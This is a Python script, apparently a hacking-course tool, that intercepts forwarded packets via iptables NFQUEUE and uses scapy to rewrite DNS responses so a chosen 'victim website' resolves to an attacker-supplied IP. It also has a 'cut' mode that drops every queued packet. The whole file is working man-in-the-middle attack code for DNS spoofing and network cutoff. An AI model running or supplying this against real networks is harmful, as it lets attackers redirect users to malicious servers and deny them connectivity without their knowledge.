import netfilterqueue
import scapy.all as scapy
import subprocess
import sys
import optparse

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Enter the name of the victim website to replace")
    parser.add_option("-t", "--target", dest="target", help="Enter the ip of target website, which replaces the victim site")
    parser.add_option("--local-test", action="store_true", dest="test", help="Set this, if you want to use it for local testing and no target is spoofed. Otherwise leave it")
    parser.add_option("-c", "--cut", action="store_true", dest="cut_net", help="If this is set, then all packets will be dropped in the quueue, regardless of DNS or not")

    (options, args) = parser.parse_args()
    if not options.url:
        print("[-] no url provided, using httpforever.com as POC\n")
        options.url="httpforever.com"
    if not options.target:
        print("[-] no target IP provided, using localhost as POC. Make sure to have a webserver running like nginx\n")
        options.target="127.0.0.1"

    return options

#Global variables here
options = get_args()
url = options.url
target = options.target
test = options.test
cut = options.cut_net
dropped = 0

def restore():
    print("\n[-] Interrupt or Error detectetd! Resetting netfilter queues....\n")
    try:
        global test
        if test:
            subprocess.call(['sudo','iptables','-D', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
            subprocess.call(['sudo','iptables','-D', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
        else:
            subprocess.call(['sudo','iptables','-D', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])

        print("\n[-] Successfully cleaned up and exited!")
    except Exception as e:
        print(f"An error occured while restoring queues {e}")
        sys.exit(1)



def create_queues():
    try:
        global test
        print("Creating forwarding queues...\n")
        if test:
            subprocess.call(['sudo','iptables','-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
            subprocess.call(['sudo','iptables','-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
        else:
            subprocess.call(['sudo','iptables','-I','FORWARD','-j','NFQUEUE','--queue-num','0'])

        print("Queue creation successful!\n")
    except Exception as e:
        print(f"An error occured while creating queues {e}")
        restore()
        sys.exit(1)



def process_packet(packet):
    global cut
    global dropped
    if cut:
        packet.drop()
        dropped+=1
        print(f"\r[+]Number of packets dropped: {dropped}", end="")
        return
    try:
        global url
        global target
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR) and scapy_packet.haslayer(scapy.DNSQR):
            qname = scapy_packet[scapy.DNSQR].qname
            if url in qname.decode():
                print("[+] Spoofing target")
                answer = scapy.DNSRR(rrname=qname, rdata=target)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1
                scapy_packet[scapy.DNS].ns = None
                scapy_packet[scapy.DNS].ar = None
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))

    
        packet.accept()
    except Exception as e:
        restore()
        sys.exit(1)




try:
    if cut:
        print("[+] net cut mode is on:\n")
    else:
        print("[+] Running normal DNS mode:\n")

    if test:
        print("[+] Running local test-->")
    else:
        print("[+] Running remote -->")
    
    create_queues()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    restore()
